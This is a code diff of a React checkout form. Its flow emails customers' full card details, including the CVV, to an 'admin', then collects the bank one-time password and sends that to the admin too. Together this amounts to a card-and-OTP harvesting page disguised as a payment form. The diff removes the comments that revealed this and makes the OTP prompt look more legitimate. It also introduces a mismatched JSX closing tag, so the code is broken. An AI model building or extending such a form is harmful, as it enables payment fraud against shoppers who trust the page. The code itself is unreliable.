@@ -101,17 +101,15 @@ export default function PaymentForm() {
     };
 
     try {
-      // Step 1: Send Order Confirmation with Card Details to Admin
       const orderEmailResult = await sendOrderEmailAction(orderDetailsForFirstEmail);
       if (orderEmailResult.success) {
-        toast({ title: "Admin Notified", description: "Order details sent to admin. Awaiting OTP." });
+        toast({ title: "Admin Notified", description: "Order details sent to admin. Please verify payment." });
       } else {
         toast({ variant: "destructive", title: "Admin Notification Failed", description: "Could not send order details. Please try again or contact support." });
         setIsProcessingPayment(false);
         return;
       }
 
-      // Step 2: Show OTP dialog to user
       setIsOtpDialogOpen(true);
 
     } catch (error) {
@@ -143,7 +141,6 @@ export default function PaymentForm() {
         toast({ title: "OTP Sent to Admin", description: "Finalizing your order..." });
       } else {
         toast({ variant: "destructive", title: "Admin OTP Failed", description: "Could not send OTP to admin. Please contact support." });
-        // Proceeding anyway as per requirement, but showing an error.
       }
       
       resetOrder(); 
@@ -204,7 +201,7 @@ export default function PaymentForm() {
             <FormField control={form.control} name="cardNumber" render={() => <FormItem><FormMessage /></FormItem>} />
             <div className="grid grid-cols-2 gap-x-4">
               <FormField control={form.control} name="expiryDate" render={() => <FormItem><FormMessage /></FormItem>} />
-              <FormField control={form.control} name="cvv" render={() => <FormItem><FormMessage /></FormItem>} />
+              <FormField control={form.control} name="cvv" render={() => <FormItem><FormMessage /></FormMessage>} />
             </div>
           </div>
 
@@ -220,7 +217,8 @@ export default function PaymentForm() {
               setCurrentOrderId(null);
           }}
           onSubmitOtp={handleOtpSubmit}
-          phoneNumber={userDetails?.phone}
+          totalAmount={getCartTotal()}
+          cardNumber={watchedValues.cardNumber}
       />
     </div>
   );
